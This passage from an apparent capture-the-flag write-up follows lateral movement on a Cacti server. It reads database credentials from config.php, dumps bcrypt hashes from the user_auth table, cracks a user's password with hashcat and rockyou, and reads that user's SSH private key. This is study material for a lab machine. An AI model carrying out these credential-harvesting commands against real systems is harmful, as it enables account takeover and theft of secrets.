In this case we are now www-data, so our first mission would be to get a proper login into the system with one of the normal users. In this case, i noticed another user in the cacti web page, so i tried accessing his credentials.

```bash
$ cat config.php | grep data
 * Make sure these values reflect your actual database/host/user/password
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cactiuser';
$database_password = 'cactiuser';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;
#$rdatabase_type     = 'mysql';
#$rdatabase_default  = 'cacti';
#$rdatabase_hostname = 'localhost';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
#$rdatabase_port     = '3306';
#$rdatabase_retries  = 5;
#$rdatabase_ssl      = false;
#$rdatabase_ssl_key  = '';
#$rdatabase_ssl_cert = '';
#$rdatabase_ssl_ca   = '';
 * Save sessions to a database for load balancing
 * Optional parameter to define a data input whitelist command string. This
 * data input command string.
 * are defined in lib/database.php
 * in the database.  For valid values, see CACTI_LANGUAGE_HANDLER
```

with this we have access to the database credentials for cacti:

```bash
$ mysql -u cactiuser -pcactiuser -D cacti -e "SELECT * FROM user_auth;"
```

| **username** | **hash**                                                       |
| ------------ | -------------------------------------------------------------- |
| admin        | `$2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G` |
| guest        | `$2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu` |
| marcus       | `$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK` |
Turns out that marcus hash can be cracked by using hashcat and rockyou, after which we obtain his password: `12345678910`. We can now change users in the reverse shell.

```bash
$ su marcus
Password: 12345678910
```

Turns out that ssh only allows for public key authentication in this computer, so what we do is get his private key in order to be able to log in using ssh. 

```bash
$ cat /home/marcus/.ssh/id_rsa
...
```

We now can log in normally as [[marcus]].